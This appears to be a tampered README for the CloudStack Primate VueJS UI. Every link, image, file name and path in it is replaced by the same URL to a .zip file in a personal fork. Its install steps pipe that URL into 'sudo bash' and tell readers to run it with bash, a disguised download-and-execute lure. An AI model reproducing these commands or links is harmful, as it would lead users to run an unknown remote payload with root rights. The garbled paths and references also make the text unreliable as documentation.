# CloudStack Primate [![Build Status](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)

A modern role-based progressive CloudStack UI based on VueJS and Ant Design.

![Primate Screenshot](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)

## Getting Started

Install node: (Debian/Ubuntu)

    curl -sL https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip | sudo -E bash -
    sudo apt-get install -y nodejs
    # Or use distro provided: sudo apt-get install npm nodejs

Install node: (CentOS/Fedora/RHEL)

    curl -sL https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip | sudo bash -
    sudo yum install nodejs

Optionally, you may also install system-wide dev tools:

    sudo npm install -g @vue/cli npm-check-updates

## Development

Clone the repository:

    git clone https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
    cd cloudstack-primate
    npm install

Override the default `CS_URL` to a running CloudStack management server:

    cp https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
    Change the `CS_URL` in the `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip` file

To configure https, you may use `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip`.

Build and run:

    npm run serve
    # Or run: npm start

Upgrade dependencies to the latest versions:

    ncu -u

Run Tests:

    npm run test
    npm run lint
    npm run test:unit

Fix issues and vulnerabilities:

    npm audit

## Production

Fetch dependencies and build:

    npm install
    npm run build

This creates a static webpack application in `dist/`, which can then be served
from any web server or CloudStack management server (jetty).

To use CloudStack management server (jetty), you may copy the built Primate build
to a new/existing webapp directory on the management server host. For example:

    npm install
    npm run build
    cd dist
    mkdir -p /usr/share/cloudstack-management/webapp/primate
    cp -vr . /usr/share/cloudstack-management/webapp/primate/
    # Use Primate at {management-server}:8080/client/primate in browser

If the webapp directory is changed, please change the `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip` in the
`https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip` and restart the management server host.

To use a separate webserver, note that the API server is accessed through the path
`/client`, which needs be forwarded to an actual CloudStack instance.

For example, a simple way to serve Primate with nginx can be implemented with the
following nginx configuration (to be put into https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip or similar):

```nginx
server {
    listen       80;
    server_name  localhost;
    location / {
        # /src/primate/dist contains the built Primate webpack
        root   /src/primate/dist;
        index  https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip;
    }
    location /client/ {
        # http://127.0.0.1:800 should be replaced your CloudStack management
        # server's actual URI
        proxy_pass   http://127.0.0.1:8000;
    }
}
```

### Docker

A production-ready Docker container can also be built with the provided
Dockerfile and build script. Official builds are available here:
https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip

Make sure Docker is installed, then run:

    bash https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip

Change the example configuration in `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip` according to your needs.

Run Primate:

    docker run -ti --rm -p 8080:80 -v $(pwd)/nginx:/etc/nginx/conf.d:ro cloudstack-primate:latest

## Documentation

### Learning Resources

- VueJS Guide: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
- Ant Design Spec: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
- Vue Ant Design: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
- JavaScript ES6 Reference: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip
- Introduction to ES6: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip

### Primate Development

- Router [Configuration](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Resource List View](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) customisation
- [Resource Detail View](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) customisation
- [Action](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) customisation
- Styling
- Testing
- [Theme](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip): Customise via `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip`
```ecmascript 6
  css: {
    loaderOptions: {
      less: {
        modifyVars: {
          /* Less variables, required modifyVars*/
          /* Refer to variables at https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip */
          'primary-color': '#F5222D',
          'link-color': '#F5222D',
          'border-radius-base': '4px',
        },
        javascriptEnabled: true,
      }
    }
  }
```

## Attributions

Primate uses the following:

- [VueJS](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Ant Design Spec](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Ant Design Vue](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Ant Design Pro Vue](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Fontawesome](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [ViserJS](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
- [Icons](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) by [Iconka](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)

## History

The project was created by [Rohit Yadav](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) over several
weekends during late 2018 and early 2019. During ApacheCon CCCUS19, on 9th
September 2019, Primate was introduced and demoed as part of the talk [Modern UI
for CloudStack](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)
([video](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip)).
[Primate](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip) was accepted by the
Apache CloudStack project on 21 Oct 2019.

## License

Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

  https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/components/menu/cloudstack_primate_2.5.zip

Unless required by applicable law or agreed to in writing,
software distributed under the License is distributed on an
"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, either express or implied.  See the License for the
specific language governing permissions and limitations
under the License.
